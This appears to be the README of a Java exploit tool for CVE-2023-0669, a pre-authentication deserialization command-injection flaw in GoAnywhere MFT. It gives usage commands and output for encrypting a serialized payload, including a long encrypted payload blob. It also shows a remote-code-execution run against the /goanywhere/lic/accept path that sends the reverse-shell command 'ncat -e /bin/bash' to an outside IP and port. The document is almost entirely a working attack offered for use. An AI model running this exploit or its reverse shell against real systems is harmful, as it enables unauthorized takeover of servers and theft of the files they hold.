# CVE-2023-0669
> GoAnywhere MFT suffers from a pre-authentication command injection vulnerability in the License Response Servlet due to deserializing an arbitrary attacker-controlled object.

## Use
### Encryption
```shell
java -jar CVE-2023-0669.jar -e ./payload.ser
```
```shell
   _______    ________    ___   ____ ___  _____       ____  _____ _____ ____ 
  / ____/ |  / / ____/   |__ \ / __ \__ \|__  /      / __ \/ ___// ___// __ \
 / /    | | / / __/________/ // / / /_/ / /_ <______/ / / / __ \/ __ \/ /_/ /
/ /___  | |/ / /__/_____/ __// /_/ / __/___/ /_____/ /_/ / /_/ / /_/ /\__, / 
\____/  |___/_____/    /____/\____/____/____/      \____/\____/\____//____/  
                                                                             
[*] Files expected to be encrypted: ./payload.ser
[+] Successful encryption: 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
```
### RCE
```shell
java -jar CVE-2023-0669.jar -t http://example.com -c "ncat -e /bin/bash 10.0.0.179 4444" -p http://127.0.0.1:8080
```
```shell
   _______    ________    ___   ____ ___  _____       ____  _____ _____ ____ 
  / ____/ |  / / ____/   |__ \ / __ \__ \|__  /      / __ \/ ___// ___// __ \
 / /    | | / / __/________/ // / / /_/ / /_ <______/ / / / __ \/ __ \/ /_/ /
/ /___  | |/ / /__/_____/ __// /_/ / __/___/ /_____/ /_/ / /_/ / /_/ /\__, / 
\____/  |___/_____/    /____/\____/____/____/      \____/\____/\____//____/  
                                                                             
[*] Target: http://example.com
[*] Path: /goanywhere/lic/accept
[*] Proxy: http://127.0.0.1:8080
[*] Command: ncat -e /bin/bash 10.0.0.179 4444
[+] Successful encryption: Jh88/jqGQWSbZmiCc1DErQhwOhCTLkYmA1yXgf86Ha5HF9IfVu...
[*] Exploiting...
[+] Exploit Successed
```